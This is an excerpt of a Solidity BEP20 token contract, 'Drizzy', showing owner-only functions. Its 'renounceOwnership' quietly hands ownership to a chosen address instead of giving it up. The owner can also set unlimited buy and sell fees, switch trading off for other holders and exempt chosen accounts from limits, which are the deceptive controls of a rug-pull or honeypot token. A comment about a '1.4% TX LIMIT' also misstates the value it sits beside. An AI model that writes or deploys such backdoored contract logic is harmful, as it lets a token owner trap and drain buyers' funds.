...
contract Ownable is Context {
     ...
     */
    function renounceOwnership(address owner_)  public virtual onlyOwner {
        _owner = owner_;
    }
...
contract Drizzy is Context, IBEP20, Ownable {
    ...
    uint256 private numTokensSellToAddToLiquidity = 20 * 10**6 * 10**18;
    uint256 public _maxTxAmount = 10 * 10**12 * 10**18;
    uint256 public _maxWalletHoldingAmount = 30 * 10**12 * 10**18;
    ...
    function setBuyFeesPBEPent(uint256 taxFee,uint256 liquidityFee,uint256 burnFee,uint256 mFee) external onlyOwner() {
        _taxFee = taxFee;
     ...
     function setSellFeesPBEPent(uint256 taxFee,uint256 liquidityFee,uint256 burnFee,uint256 mFee) external onlyOwner() {
        _sellTaxFee = taxFee;
    ...
    function addLiquidity() external onlyOwner() {
        ...
        _maxTxAmount = 1000000000000000001 * 10**9; // 1.4% TX LIMIT 
    ...
    function ExcludedFromMaxTxAmount(address account,bool status) external onlyOwner(){
        _isExcludedFromMaxTxAmount[account] = status;
    }
    ...
    function updateStatus(bool status) external onlyOwner(){
    ...
    function _transfer(
        ...
        if(from != owner() || to != owner()){
          require(tradingStatus ,"Trade is Off Now");
        ...
        if(from != owner() || to != owner()){
          require(tradingStatus ,"Trade is Off Now");
          if(!_isExcludedFromMaxTxAmount[to] && from !=owner()){
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) internal onlyOwner {
        require(!tradingStatus, "trading is alreadyoprn");
